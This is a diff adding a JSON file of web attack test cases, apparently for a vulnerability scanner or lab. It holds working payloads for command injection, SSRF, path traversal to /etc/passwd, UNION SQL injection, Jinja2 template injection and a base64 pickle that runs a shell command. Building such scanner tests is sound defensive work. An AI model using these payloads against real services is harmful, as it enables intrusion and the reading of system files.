@@ -1,0 +1,82 @@
+[
+  {
+    "id": "dyn_cmd_1",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1;id"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "semicolon command separator for command injection"
+  },
+  {
+    "id": "dyn_cmd_2",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1$(id)"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "command substitution via $() syntax"
+  },
+  {
+    "id": "dyn_ssrf_1",
+    "endpoint": "/fetch",
+    "method": "GET",
+    "params": {
+      "url": "http://127.0.0.1:8080/"
+    },
+    "detect_pattern": "status|ok|health|alive",
+    "technique": "direct localhost SSRF to internal service"
+  },
+  {
+    "id": "dyn_ssrf_2",
+    "endpoint": "/fetch",
+    "method": "GET",
+    "params": {
+      "url": "file:///etc/passwd"
+    },
+    "detect_pattern": "root:.*:0:0",
+    "technique": "file:// scheme SSRF to read local files"
+  },
+  {
+    "id": "dyn_path_1",
+    "endpoint": "/read",
+    "method": "GET",
+    "params": {
+      "name": "../../../../etc/passwd"
+    },
+    "detect_pattern": "root:.*:0:0",
+    "technique": "deep path traversal with multiple ../ sequences"
+  },
+  {
+    "id": "dyn_sqli_1",
+    "endpoint": "/search",
+    "method": "GET",
+    "params": {
+      "q": "' UNION SELECT flag,2,3 FROM secrets--"
+    },
+    "detect_pattern": "FLAG\\{",
+    "technique": "UNION-based SQL injection to extract secrets table"
+  },
+  {
+    "id": "dyn_ssti_1",
+    "endpoint": "/render",
+    "method": "POST",
+    "params": {
+      "template": "{{7*7}}"
+    },
+    "detect_pattern": "49",
+    "technique": "basic Jinja2 SSTI arithmetic expression evaluation"
+  },
+  {
+    "id": "dyn_deser_1",
+    "endpoint": "/load",
+    "method": "POST",
+    "params": {
+      "data": "gASVKAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjA9pZCA+IC90bXAvaWQudHh0lIWUUpQu"
+    },
+    "detect_pattern": "uid=[0-9]+\\(|200",
+    "technique": "pickle RCE via __reduce__ executing id command"
+  }
+]
